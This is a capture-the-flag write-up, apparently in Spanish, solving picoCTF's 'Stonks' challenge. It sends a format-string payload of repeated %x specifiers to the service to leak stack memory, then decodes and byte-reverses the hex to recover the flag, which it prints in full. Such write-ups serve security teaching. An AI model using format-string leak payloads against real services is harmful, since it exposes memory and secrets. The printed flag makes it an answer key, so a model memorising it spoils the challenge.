## Descripción 

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

## Hints

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

## Solución

```
kifuel@DESKTOP-3C07MOG:~$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
97b83d0804b00080489c3f7f94d80ffffffff197b6160f7fa2110f7f94dc7097b7180197b83b097b83d06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffc9007df7fcfaf8f7fa244069f25d0010f7e31ce9f7fa30c0f7f945c0f7f94000ffc91318f7e2268df7f945c08048ecaffc913240f7fb6f09804b000f7f94000f7f94e20ffc91358f7fbcd50f7f9589069f25d00f7f94000804b000ffc913588048c8697b6160ffc91344ffc913588048be9f7f943fc0ffc9140cffc914041197b616069f25d00ffc9137000f7dd7fa1f7f94000f7f940000f7dd7fa11ffc91404ffc9140cffc9139410f7f94000f7fb770af7fcf0000f7f9400000ff7449fbd7ac6feb000180486300f7fbcd50f7fb7960804b00018048630080486628048b851ffc914048048cd08048d30f7fb7960ffc913fcf7fcf9401
Portfolio as of Wed May 17 14:29:15 UTC 2023


1 shares of IYQU
1 shares of MINZ
17 shares of JA
52 shares of RYZG
67 shares of MAGL
336 shares of YBY
244 shares of EIK
Goodbye!

```

este fragmento de la salida la pasamos porf cyberchef , esta en hexadecimal 
```
6f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431
```

```
ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41
```
Ahora lo volteamos 

```
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
```
## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}